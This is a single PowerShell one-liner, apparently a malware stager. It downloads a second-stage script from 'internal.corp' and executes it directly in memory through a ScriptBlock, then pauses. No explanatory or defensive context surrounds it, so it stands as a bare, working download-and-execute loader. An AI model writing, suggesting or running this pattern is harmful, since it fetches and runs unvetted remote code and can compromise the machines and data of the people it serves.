
$Stage1Url = "http://internal.corp/stage2.ps1"; $DownloadedScript = (iwr $Stage1Url -UseBasicParsing).Content; [ScriptBlock]::Create($DownloadedScript).Invoke(); Start-Sleep -Seconds 24
